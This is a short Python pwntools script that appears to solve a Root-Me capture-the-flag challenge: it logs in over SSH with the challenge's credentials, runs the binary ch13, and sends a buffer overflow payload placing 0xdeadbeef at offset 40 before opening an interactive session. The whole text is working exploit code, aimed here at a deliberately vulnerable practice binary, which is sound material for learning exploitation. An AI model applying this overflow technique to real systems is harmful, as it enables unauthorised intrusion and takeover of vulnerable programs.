from pwn import *

io = ssh(user = 'app-systeme-ch13', host='challenge02.root-me.org', port=2222, password='app-systeme-ch13')
p = io.process('./ch13')

payload = flat({
    40: [
        0xdeadbeef
    ]
})
p.sendline(payload)
p.interactive()